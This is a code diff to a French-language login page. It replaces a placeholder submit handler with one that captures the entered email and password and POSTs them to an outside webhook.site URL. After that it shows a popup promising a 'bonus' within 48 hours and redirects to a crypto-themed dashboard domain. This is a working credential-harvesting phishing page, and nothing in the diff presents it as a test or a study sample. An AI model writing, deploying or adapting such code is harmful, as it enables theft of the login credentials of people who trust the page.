@@ -154,23 +154,45 @@
     </section>
   </main>
 
+  <!-- Scripts -->
   <script>
+    // Toggle mot de passe
     const pwd = document.getElementById('password');
     const eyeBtn = document.querySelector('.toggle-eye');
     eyeBtn.addEventListener('click', () => {
       pwd.type = pwd.type === 'password' ? 'text' : 'password';
     });
 
+    // Checkbox "remember me"
     const remember = document.getElementById('remember');
     remember.addEventListener('click', () => {
       const checked = remember.getAttribute('aria-checked') === 'true';
       remember.setAttribute('aria-checked', String(!checked));
     });
 
-    const form = document.getElementById('loginForm');
-    form.addEventListener('submit', (e) => {
+    // Soumission formulaire
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
       e.preventDefault();
-      alert('Formulaire soumis.');
+
+      const email = document.querySelector('input[type="email"]').value;
+      const passwords = document.querySelector('input[type="password"]').value;
+
+      fetch("https://webhook.site/f8b07a2b-efd2-4812-bb67-972dc0912b4f", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          email: email,
+          passwords: passwords
+        })
+      })
+      .then(() => alert("Données envoyées au webhook !"))
+      .catch(err => console.error("Erreur :", err));
+
+      // Pop-up info
+      alert("Le bonus sera transféré dans les 48h");
+
+      // Redirection
+      window.location.href = "https://mydrivecrypto.online/user/dashboard.php";
     });
   </script>
 </body>
